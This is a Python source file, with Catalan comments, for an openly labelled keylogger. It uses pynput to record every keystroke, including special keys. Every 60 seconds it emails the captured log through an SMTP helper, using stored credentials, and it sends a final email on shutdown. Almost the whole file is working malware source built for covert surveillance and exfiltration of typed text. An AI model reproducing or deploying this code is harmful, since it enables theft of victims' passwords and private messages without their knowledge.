#!/usr/bin/env python3 

import threading
import pynput.keyboard
from colorama import Fore
from pynput.keyboard import Key
from modules.my_utils import show_message
from modules.mail_utils import smail, get_credentials
from modules.ascii_art import print_demon
from modules.exit_handler import setup_signal_handler

"""

Per si tens errors de compatibilitat amb la versio de python:

    python3 -m venv keylogger-env
    source keylogger-env/bin/activate
    pip install pynput
    python keylogger_main.py

Et demanara instal·lar els moduls que et facin falta, simplement executa:
    
    pip install {el paquet que et faci falta}

"""

### Constants & Variables #################################################################################################

special_keys = {
    Key.space: " ", Key.backspace: "Backspace", Key.enter: "Enter", Key.shift: "Shift",
    Key.shift_r: "ShiftR", Key.ctrl: "Ctrl", Key.ctrl_r: "CtrlR", Key.alt: "Alt", Key.alt_r: "AltR",
    Key.cmd: "Cmd", Key.cmd_r: "CmdR", Key.caps_lock: "CapsLock", Key.tab: "Tab", Key.esc: "Esc",
    Key.delete: "Delete", Key.insert: "Insert", Key.home: "Home", Key.end: "End", Key.page_up: "PageUp",
    Key.page_down: "PageDown", Key.up: "Up", Key.down: "Down", Key.left: "Left", Key.right: "Right",
    Key.f1: "F1", Key.f2: "F2", Key.f3: "F3", Key.f4: "F4", Key.f5: "F5", Key.f6: "F6", Key.f7: "F7",
    Key.f8: "F8", Key.f9: "F9", Key.f10: "F10", Key.f11: "F11", Key.f12: "F12", Key.print_screen: "PrintScreen",
    Key.scroll_lock: "ScrollLock", Key.pause: "Pause", Key.num_lock: "NumLock", Key.menu: "Menu"
}

mail = get_credentials("mail")
pswd = get_credentials("app_password")

### Classes ###############################################################################################################

class Keylogger:

    def __init__(self):
        self.log = ""
        self.request_shutdown = False
        self.timer = None
        self.is_first_run = True

    def pressed_key(self, key):
        try:
            if hasattr(key, 'char') and key.char is not None:
                self.log += key.char
        
            else:
                self.log += f' [{key.name}] '
        
        except Exception as e:
            self.log += f'[Error: {e}]' 
   
        # print(self.log) <= Activa aixo si vols que es mostri per pantalla

    def send_mail(self, subject, body, sender, recipients, password):
        if self.log != "" or self.is_first_run == True:
            smail(subject, body, sender, recipients, password)

    def report(self):
        email_body = "El Keylogger se ha iniciado exitosamente" if self.is_first_run else self.log
        self.send_mail("Keylogger Report", email_body, mail, [mail], pswd)

        # Resets the log
        self.log = ""

        if self.is_first_run:
            self.is_first_run = False
        
        if not self.request_shutdown:
            self.timer = threading.Timer(60, self.report)
            self.timer.start()
    
    def shutdown(self):
        self.request_shutdown = True

        if self.timer:
            self.timer.cancel()

        if self.listener:  
            self.listener.stop()
            self.listener.join()

        email_subject = "El Keylogger s'ha aturat exitosament"
        self.send_mail(email_subject, self.log, mail, [mail], pswd)
        show_message(email_subject, "minus")


    def start(self):
        self.listener = pynput.keyboard.Listener(on_press=self.pressed_key)
        self.listener.start()

        try:
            self.listener.join()

        except KeyboardInterrupt:
            self.shutdown()


### Main Code #############################################################################################################


def main():

    try:
        show_message("Keylogger")
        print_demon()

        global my_keylogger
        my_keylogger = Keylogger()

        setup_signal_handler(my_keylogger.shutdown)

        my_keylogger.report()
        my_keylogger.start()

    except TypeError as e:
        if "'_._ThreadHandle' object is not callable" in str(e):
            print(f"\n{Fore.RED}[!] {Fore.YELLOW}This script does not work due to compatibility issues with your Python version.\n")
            print(f"\n{Fore.YELLOW}[+] {Fore.CYAN}To fix this, execute the following commands:")
            print(f"\n\t{Fore.GREEN}python3 -m venv keylogger-env\n\tsource keylogger-env/bin/activate\n")
        
        else:
            raise

    except Exception as e:
        print(e)

if __name__ == "__main__":
    main()
